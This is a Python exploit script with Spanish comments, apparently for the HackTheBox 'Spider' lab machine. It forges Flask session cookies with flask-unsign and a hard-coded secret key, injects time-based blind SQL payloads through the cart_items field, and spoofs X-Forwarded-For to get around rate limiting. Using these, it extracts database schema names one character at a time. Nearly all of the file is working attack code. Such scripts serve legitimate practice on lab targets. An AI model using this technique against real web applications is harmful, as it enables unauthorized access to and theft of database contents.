#!/usr/bin/python3

### References
### | enumerate(): https://stackoverflow.com/questions/2081836/how-to-read-specific-lines-from-a-file-by-line-number
### | flash-unsign: https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce
### | terminate_loop: https://stackoverflow.com/questions/24426451/how-to-terminate-loop-gracefully-when-ctrlc-was-pressed-in-python/24426816
### | Avoid system errors: https://stackoverflow.com/questions/33985863/hiding-console-output-produced-by-os-system

import os, subprocess, signal
import requests, time, string
from pwn import *

class BienMal:
    DONE = "✔"
    FAIL = "✘"

# ¬ CTRL+C
terminate = False
def def_handler(sig, frame):
    global terminate
    terminate = True
    print("\nsaLi3nDO...\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

# ¬ Variables
url = "http://spider.htb"
uuid_user = "fd0b0386-ba0c-4b54-9ad2-115522b90729"
secret_key = "Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942"
# abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~£
dic_letters = string.ascii_letters + string.digits + string.punctuation + "£"

session = requests.Session()

p1 = log.progress("Payload")
print()

# Simulamos que existen 7 bases de datos, esto podria ser dinamico, pero te lo dejo de tarea
for row in range(0,7):
    if terminate: break  # Evitamos que imprima los demás "Database" y "Payload"
    p2 = log.progress("Database [%s]" % (row))
    result = ""
    # Simulamos que cada base de datos tiene 50 caracteres en su nombre
    for row_position in range(1,50):
        for letter in dic_letters:
            if terminate: break  # Logramos salir del loop despues de ejecutar CTRL+C
            
            #payload = "1 or IF(Ascii(substring(database(),%d,1))=%d,sleep(0.7),0)--" % (row_position, ord(letter))  # Esta query nos extrae unicamente la DB en la que estamos
            payload = "1 or IF(Ascii(substring((SELECT schema_name FROM information_schema.schemata LIMIT %d,1),%d,1))=%d,sleep(0.6),1)#" % (row, row_position, ord(letter)) # Esta todas
            p1.status(payload)

            json_payload = '{"cart_items": ["%s"],"uuid": "%s"}' % (payload, uuid_user)
            try:
                # ¬ Generamos token sin firmar con la herramienta flask-unsign
                session_token = subprocess.check_output("flask-unsign --sign --cookie '%s' --secret '%s' 2>/dev/null" % (json_payload, secret_key), shell=True, stderr=subprocess.STDOUT)
                # ¬ Damos formato al header, bypasseamos x-rate-limit y enviamos la nueva cookie
                headers = {
                    "X-Forwarded-For": "127.0.0.1",
                    "Cookie" : "session=" + session_token.decode('utf-8').strip('\n')
                }
                # ¬ Intentamos visitar /cart con la nueva cookie, si la respuesta demora más de 3 segundos sabemos que nuestra letra genera una inyección SQL
                time_before = time.time()
                r = session.get(url + '/cart', headers=headers)
                time_after = time.time()

                # A veces la web como que muere y hace que las siguientes letras (que deberian funcionar) no funcionen y pase a la siguiente base de datos con la actual incompleta
                # Tonces le damos un segundo a ver si se estabiliza (**al parecer si le da un respiro pero a veces sigue fallando**, esto es problema de la máquina.)
                time.sleep(0.2) 

                if time_after - time_before > 3: 
                    result += letter
                    p2.status(result)
                    break
            except Exception as e:
                if "returned non-zero exit status 127" in str(e):
                    print("\n[" + BienMal.FAIL + "] Instala 'flask-unsign': pip install flask-unsign\n")
                    exit(1)
                pass

        if letter == "£":  # Evitamos que siga iterando una base de datos que ya descubrio
            p2.success(result)
            break

payload = "esel3nte!"
p1.success(payload)
